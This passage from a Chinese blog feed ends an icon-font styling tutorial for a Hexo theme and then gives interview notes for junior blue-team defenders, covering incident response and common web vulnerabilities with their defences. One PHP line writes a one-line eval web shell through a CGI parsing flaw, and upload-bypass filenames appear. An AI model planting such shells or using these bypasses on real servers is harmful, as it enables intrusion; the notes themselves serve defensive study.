class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line"><span class="attribute">font-family</span>: <span class="string">&#x27;iconfont&#x27;</span>;</span><br><span class="line"><span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;/fonts/iconfont.eot&#x27;</span>);</span><br><span class="line"><span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;/fonts/iconfont.eot?#iefix&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;embedded-opentype&#x27;</span>),</span><br><span class="line"><span class="built_in">url</span>(<span class="string">&#x27;/fonts/iconfont.woff2&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff2&#x27;</span>),</span><br><span class="line"><span class="built_in">url</span>(<span class="string">&#x27;/fonts/iconfont.woff&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff&#x27;</span>),</span><br><span class="line"><span class="built_in">url</span>(<span class="string">&#x27;/fonts/iconfont.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;truetype&#x27;</span>),</span><br><span class="line"><span class="built_in">url</span>(<span class="string">&#x27;/fonts/iconfont.svg#iconfont&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;svg&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>打开<code>iconfont.css</code>，复制其中形似如下的代码到<code>[Blogroot]\themes\butterfly\source\css\custom.css</code>中：</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.iconfont</span> &#123;</span><br><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;iconfont&quot;</span> <span class="meta">!important</span>;</span><br><span class="line"><span class="comment">/* font-family 可以自定义，但是必须和上面@font-face中的font-family保持一致 */</span></span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">3em</span>;</span><br><span class="line"><span class="comment">/* 可以定义图标大小 */</span></span><br><span class="line"><span class="attribute">font-style</span>: normal;</span><br><span class="line">-webkit-<span class="attribute">font-smoothing</span>: antialiased;</span><br><span class="line">-moz-osx-<span class="attribute">font-smoothing</span>: grayscale;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-rat</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e60e&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#85c3de</span>;</span><br><span class="line">  <span class="comment">/* 可以使用color属性来定义图标颜色 */</span></span><br><span class="line">  <span class="comment">/* 若已经在项目设置中勾选了彩色选项，则无需再定义图标颜色*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-ox</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e60c&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffaf6e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-tiger</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e611&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f7c768</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-rabbit</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e60d&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffbdd8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-dragon</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e609&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ff8787</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-snake</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e610&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c3d686</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-horse</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e60a&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffaf6e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-goat</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e608&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f7c768</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-monkey</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e60b&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c3d686</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-rooster</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e60f&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ff8787</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-dog</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e607&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#85c3de</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-boar</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\e612&quot;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffbdd8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用图标"><a href="#使用图标" class="headerlink" title="使用图标"></a>使用图标</h3><p>打开主题配置文件_config_butterfly.yml</p><p>使用格式：font-family名字(没有修改过一般都是iconfont)  icon名称</p><p><img src="https://s1.ax1x.com/2023/06/01/p9xfRZd.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝初面试总结</title>
      <link href="/post/f41becb6.html"/>
      <url>/post/f41becb6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天和朋友聊天并看了一些蓝初面经，我将面试重点分为应急响应、常见漏洞、流量特征、端口与杂项几个方面</p><h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="1-DDOS与CC攻击"><a href="#1-DDOS与CC攻击" class="headerlink" title="1. DDOS与CC攻击"></a>1. DDOS与CC攻击</h3><ul><li>快速检测并确认攻击类型和攻击源；</li><li>提高带宽和资源利用率，以提供更强的承载能力；</li><li>实施流量清洗、流量限制和IP封堵等措施，清除恶意攻击流量；</li><li>配合 ISP 进行攻击源 IP 的追踪和协助；</li><li>在攻击持续期间，保持实时监控和跟进，随时更新应急响应策略。</li></ul><h3 id="2-动态链接库DLL劫持"><a href="#2-动态链接库DLL劫持" class="headerlink" title="2. 动态链接库DLL劫持"></a>2. 动态链接库DLL劫持</h3><p>概述：攻击者通过将恶意 DLL 文件替换为合法的 DLL 文件，从而实现向操作系统注入恶意代码的目的</p><ul><li>立即隔离受影响的系统，并从网络中断开，以避免进一步的攻击和传播。</li><li>恢复被劫持的 DLL 文件，将其从系统中删除，并替换为原始的、正确的 DLL 文件。如果原始的 DLL 文件已经被篡改或删除，需要重新安装相应的软件或应用程序来获取正确的 DLL 文件。</li><li>检查被劫持的 DLL 文件是否包含恶意代码，以及其他可能被感染的文件和系统组件。使用杀毒软件和反恶意软件等工具来清除恶意代码。</li><li>修改注册表，防止恶意 DLL 文件再次被加载。例如，修改HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 键值，将所有可信 DLL 文件添加到其中。</li><li>加强安全措施，例如，禁用不必要的服务和进程、添加访问控制列表、加密重要数据等。</li></ul><h3 id="3-排查思路（基本流程）"><a href="#3-排查思路（基本流程）" class="headerlink" title="3. 排查思路（基本流程）"></a>3. 排查思路（基本流程）</h3><ul><li><p>确认事件：首先需要了解事件的具体情况，包括发生的时间、影响范围、受影响的系统和服务等信息。同时还需要判断是否存在钓鱼邮件、病毒感染等情况。</p></li><li><p>收集证据：在确认安全事件后，需要及时收集相关证据，包括日志记录、网络流量、进程信息、文件系统状态等信息，并进行存档备份，为后续的分析提供依据。</p></li><li><p>分析数据：对收集到的证据进行分析，尤其是日志和网络流量等数据，可以帮助快速定位问题和确认是否存在攻击行为。在分析过程中，可以利用一些常见的工具，例如 Wireshark、Nmap、Sysinternals 等。</p></li><li><p>阻止攻击：在确认存在攻击行为后，需要立即采取措施，阻止攻击并保护现有系统。这些措施包括封锁网络、隔离受感染主机、关闭漏洞等。</p></li><li><p>制定应急计划：包括恢复数据、修复漏洞、加强安全防御等方面。</p></li></ul><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.  SQL注入"></a>1.  SQL注入</h3><p>（1）宽字节注入</p><p>原理：</p><p>目标站点对于特殊字符的转义（单双引号）前面会添加斜杠/，斜杠/ url 编码是 %5c，如果目标站点使用的是 gbk 编码，则可以构造 payload %df 加 单引号，%df 与%5c 进行结合成为一个汉字，而单引号则逃逸了出去。</p><p>（2）常规</p><p>种类：</p><ol><li><p>基于错误的注入：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。</p><p><img src="https://s1.ax1x.com/2023/05/26/p9qFmtO.png" alt=""></p></li><li><p>盲注注入：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</p></li><li><p>基于联合查询的注入：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向查询结果集中添加用户列表或密码信息。</p></li><li><p>基于布尔逻辑的注入：在这种类型的 SQL 注入中，攻击者会构造一个查询，该查询会返回一个布尔值。攻击者可以利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</p></li><li><p>时间延迟注入：在时间延迟注入中，攻击者通过向查询中添加时间延迟语句来判断查询是否成功执行。例如，攻击者可以使用 SLEEP() 函数来强制查询等待一段时间，在等待期间观察程序的响应时间来确定注入点是否存在。</p></li></ol><p>检测：</p><ol><li>查看数据库异常日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。</li><li>应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。</li><li>使用专业的漏洞扫描工具。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li><li>手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。</li></ol><p>原理：<br>对用户输入的数据没有进行严格的过滤与判断，导致用户构造各种恶意 payload 拼接进后台数据库查询语句中执行。</p><p>原因：<br>SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p><p>危害：<br>数据库信息泄漏<br>通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。<br>破坏硬盘数据，瘫痪全系统。</p><p>防御：</p><ol><li>输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。</li><li>参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。</li><li>最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。</li><li>安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式。</li><li>异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li></ol><h3 id="2-XSS（跨站脚本攻击）"><a href="#2-XSS（跨站脚本攻击）" class="headerlink" title="2. XSS（跨站脚本攻击）"></a>2. XSS（跨站脚本攻击）</h3><p>原理：它利用了应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向网站上注入恶意脚本代码，使其他用户在浏览网站时受到攻击。XSS攻击通常发生在包含表单、搜索框和评论框等用户输入区域的Web页面上。攻击者会向这些输入框中插入包含恶意脚本代码的数据。例如，如果一个在线购物网站没有对用户在评论框中输入的HTML代码进行过滤，那么攻击者可以通过在评论框中注入恶意JavaScript代码来窃取其他用户的登录凭证或个人信息。</p><p>种类：存储型，反射型，DOM型</p><p>区别：存储型:常出现在信息修改添加等地方，导致恶<br>意代码被存储在数据库中，每当被攻击者访问到后就<br>会触发执行；反射型：常出现在url中，一般需要攻击<br>者提前构造好恶意链接，欺骗用户点击，触发攻击代<br>码；DOM型：攻击代码在url中，然后输出在了浏览器<br>的DOM节点中。简单比较会发现，存储和反射都经过<br>服务器，而DOM是纯前端。</p><p>危害：<br>（1）网络钓鱼，盗取用户账号<br>（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作<br>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等<br>（4）强制弹出广告页面，刷流量等<br>（5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂马等<br>（6）进行基于大量的客户端攻击，如DDOS攻击</p><p>防御：<br>（1）代码里对用户输入的地方和变量都需要仔细检查长度和对单引号、分号等特殊符号做过滤；对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only<br>（2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。<br>（3）通过使cookie和系统ip绑定来降低cookie泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。<br>（4）尽量采用POST而非GET提交表单</p><h3 id="3-CSRF（跨站点请求伪造）"><a href="#3-CSRF（跨站点请求伪造）" class="headerlink" title="3. CSRF（跨站点请求伪造）"></a>3. CSRF（跨站点请求伪造）</h3><p>原理：用户未关闭与正规网站的会话就重新tab了一个新的页面并访问攻击者的虚假网站，导致自身cookie或其他个人信息被攻击者获取，攻击者可以使用携带用户cookie的浏览器访问其他网站，网站默认从浏览器中获取cookie，误认为是用户操作，导致操作者可以执行一些未经授权的行为<br>3.防御<br>（1） GET、POST的正确使用<br>（2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）<br>（3） Anti CSRF Token：为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><h3 id="4-SSRF（服务端请求伪造）"><a href="#4-SSRF（服务端请求伪造）" class="headerlink" title="4. SSRF（服务端请求伪造）"></a>4. SSRF（服务端请求伪造）</h3><p>原理：</p><p>攻击者通过在受害者服务器上执行恶意代码，使该服务器对指定的目标URL发起网络请求。这种攻击通常利用了开发人员在编写Web应用程序时没有正确处理用户输入数据的漏洞，例如将用户提供的URL参数直接传递给后台服务器而没有做任何验证。</p><p>在SSRF攻击中，攻击者可以欺骗Web应用程序向其他服务器发送HTTP请求，例如内部服务器、本地网络资源或公共Web API等。攻击者还可以使用SSRF攻击来绕过防火墙保护，访问内部系统，并执行未授权的操作，例如读取机密数据、修改配置文件或上传恶意文件等。</p><p>URL伪协议：</p><p>file://    这种URL Schema可以尝试从文件系统中获取文件</p><p>dict://    这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表</p><p>sftp://    Sftp代表SSH文件传输协议，或安全文件传输协议，这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作</p><p>ldap://    LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</p><p>tftp://      TFTP是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机</p><p>gopher://    Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><p>防御：</p><ol><li>对所有输入进行严格的验证和过滤：开发人员在编写Web应用程序时应对所有输入数据进行严格的验证和过滤，以确保不会将任何恶意代码或非法请求发送到受害者服务器。</li><li>使用白名单：开发人员可以使用白名单技术限制应用程序仅向可信的服务器发送请求，例如内部服务器或特定的Web API。</li><li>限制服务器端请求发出范围，例如通过禁止或限制特定的协议、域名或IP地址，以避免攻击者可以利用SSRF漏洞来发送恶意请求。</li><li>禁止跳转，限制请求的端口为http常用的端口，比如 80、443、8080、8090</li><li>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 </li></ol><h3 id="5-DDOS攻击"><a href="#5-DDOS攻击" class="headerlink" title="5. DDOS攻击"></a>5. DDOS攻击</h3><p>1.原理<br>攻击者是使用傀儡机(俗称“肉鸡”，受病毒木马操控的计算机或服务器)作为攻击平台，通过大量伪装合法的请求占用大量网络资源，以达到使指定目标的网络或服务瘫痪中断。<br>2.危害：<br>服务器瘫痪、用户无法正常访问。<br>3.类型<br>（1）SYN Flood攻击：这种攻击方法是经典最有效的DDoS方法，主要是通过向受害主机发送大量伪造源 IP 和源端口的 SYN 或 ACK 包，导致主机的缓存资源被耗尽或忙于发送回应包而造成拒绝服务，可通杀各种系统的网络服务。这种攻击由于源头都是伪造的，所以追踪起来比较困难。但是，该攻击实施起来有一定难度，需要大量高带宽的僵尸主机。<br>（2）TCP 全连接攻击：这种攻击是为了绕过常规防火墙的检查而设计的。一般情况下，常规防火墙大多对于正常的 TCP 连接是放过的，但是很多网络服务程序能接受的 TCP 连接数是有限的。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的 TCP 连接，直到服务器的内存等资源被耗尽而被拖跨， 从而造成拒绝服务。种攻击的特点是可绕过一般防火墙的防护而达到攻击;缺点是需要找很多僵尸主机，且僵尸主机的IP 是暴露，易被追踪。<br>（3）刷 Script 脚本攻击：这种攻击是跟服务器建立正常的TCP连接， 并不断的向脚本程序提交查询、 列表等大量耗费数据库资源的调用。一般来说， 提交一个指令对客户端的耗费和带宽的占用是几乎可以忽略的，而服务器为处理此请求却可能要从上万条记录中去查出某个记录，这种处理过程对资源的耗费是非常大。攻击者只需通过代理向目标服务器大量递交查询指令，只需数分钟就会把服务器资源消耗掉而导致拒绝服务。这种攻击的特点是可以完全绕过普通的防火墙防护， 轻松找一些代理就可实施攻击;缺点是对付只有静态页面的网站效果会大打折扣，并且会暴露攻击者的IP地址。<br>4.防御：<br>（1）采用高性能的网络设备，升级主机服务器硬件，保证充足的网络带宽<br>（2）尽量避免NAT的使用（NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间）<br>（3）把网站做成静态页面<br>（4）增强操作系统的TCP/IP栈<br>（5）安装专业抗DDOS防火墙</p><h3 id="6-CC攻击"><a href="#6-CC攻击" class="headerlink" title="6. CC攻击"></a>6. CC攻击</h3><p>原理：</p><p>CC(ChallengeCollapsar，挑战黑洞)攻击是DDoS攻击的一种类型，攻击者利用众多广泛可用的免费代理服务器模拟多个用户向受害服务器发送大量貌似合法的请求，许多免费代理服务器支持匿名模式，这使追踪变得非常困难</p><p>检测：</p><p>1、命令行法</p><p>一般遭受CC攻击时，Web服务器会出现80端口对外关闭的现象， 因为这个端口已经被大量的垃圾数据堵塞了正常的连接被中止了。可以通过在命令行下输入命令netstat -an来查看，　“SYN_RECEIVED”是TCP连接状态标志，意思是“正在处于连接的初始同步状态 ”，表明无法建立握手应答处于等待状态。这就是攻击的特征，一般情况下这样的记录一般都会有很多条，表示来自不同的代理IP的攻击。</p><p>2、查看系统日志</p><p>Web日志一般在C:\WINDOWS\system32\LogFiles\HTTPERR目录下，该目录下用类似httperr1.log的日志文件，这个文件就是记录Web访问错误的记录。管理员可以依据日志时间属性选择相应的日志打开进行分析是否Web被CC攻击了。</p><p>防御：</p><p>1、服务器垂直扩展和水平扩容</p><p>资金允许的情况下，这是最简单的一种方法，本质上讲，这个方法并不是针对CC攻击的，而是提升服务本身处理并发的能力，但确实提升了对CC攻击的承载能力。垂直扩展：是指增加每台服务器的硬件能力，如升级CPU、增加内存、升级SSD固态硬盘等。水平扩容：是指通过增加提供服务的服务器来提升承载力。</p><p>2、数据缓存(内存级别，不要用文件)</p><p>对于服务中具备高度共性，多用户可重用，或单用户多次可重用的数据，一旦从数据库中检索出，或通过计算得出后，最好将其放在缓存中，后续请求均可直接从缓存中取得数据，减轻数据库的检索压力和应用服务器的计算压力，并且能够快速返回结果并释放进程，从而也能缓解服务器的内存压力。要注意的是，缓存不要使用文件形式，可以使用redis、mem—cached等基于内存的nosql缓存服务，并且与应用服务器分离，单独部署在局域网内。局域网内的网络IO肯定比起磁盘IO要高。为了不使局域网成为瓶颈，千兆网络也是有必要的。</p><p>3、页面静态化</p><p>与数据缓存一样，页面数据本质上也属于数据，常见的手段是生成静态化的html页面文件，利用客户端浏览器的缓存功能或者服务端的缓存服务，以及CDN节点的缓冲服务，均可以降低服务器端的数据检索和计算压力，快速响应结果并释放连接进程。</p><p>4、IP限制</p><p>可以将IP限制前置至JCb层的防火墙或负载均衡器上去做，并且可以调大限制的阈值，防止恶意访问穿透到应用服务器上，造成应用服务器压力。</p><p>5、接入高防</p><p>中云AI云防护系统通过用户与防护节点建立加密隧道，接管客户端与服务器端网络连接，准确识别攻击者与真正的访客。</p><h3 id="7-文件上传漏洞"><a href="#7-文件上传漏洞" class="headerlink" title="7. 文件上传漏洞"></a>7. 文件上传漏洞</h3><p>原理：<br>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><p>相关日志：</p><ol><li>文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息</li><li>访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传 IP 地址等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。</li></ol><p>攻击特征：</p><ol><li>文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。</li><li>文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。</li><li>文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。</li><li>大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。</li><li>目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。</li></ol><p>绕过：</p><ol><li>修改文件扩展名：攻击者可以将可执行文件的扩展名更改为其他文件格式的扩展名，例如将.exe文件更改为.jpg文件。这样，即使应用程序检查文件扩展名，也会认为该文件是合法的图像文件。</li><li>绕过文件类型检查：应用程序通常会限制上传文件的MIME类型或文件头，以确保只允许上传合法的文件。但是，攻击者可以通过修改文件头或添加特殊字符等方式来伪装文件类型和内容，从而绕过文件类型检查。</li><li>前端JS突破：抓包修改文件名 或者 禁用当前浏览器的JS脚本</li></ol><p>防御：</p><ol><li>文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。</li><li>检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。</li><li>重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。</li><li>存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。</li><li>使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。</li></ol><h3 id="8-文件解析漏洞"><a href="#8-文件解析漏洞" class="headerlink" title="8. 文件解析漏洞"></a>8. 文件解析漏洞</h3><p>分类：</p><p>1.IIS 6.0解析利用方法有两种<br>（1）目录解析：/xx.asp/xx.jpg<br>（2）文件解析：wooyun.asp;.jpg<br>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg会被服务器看成是wooyun.asp<br>还有IIS6.0 默认的可执行文件除了asp还包含这三种.asa、.cer、.cdx<br>2.Apache解析漏洞后缀名解析漏洞<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断直到识别。<br>3.PHP CGI解析漏洞<br>在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>的文件，然后访问wooyun.jpg/x.php,（x.php不存在）在这个目录下就会生成一句话木马 shell.php。<br>4.%00截断漏洞<br>当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p><p>防御：<br>1、防御方法：升级IIS版本，IIS5.1与7.5均无此漏洞<br>2、Apache文件解析漏洞：<br>不要使用AddHandler，改用SetHandler，就不会有解析问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch&quot;.+.php$&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>禁止.php这样的文件执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch&quot;.+.ph(p[3457]?|t|tml).&quot;&gt;</span><br><span class="line">Require all denied</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="9-文件包含漏洞"><a href="#9-文件包含漏洞" class="headerlink" title="9. 文件包含漏洞"></a>9. 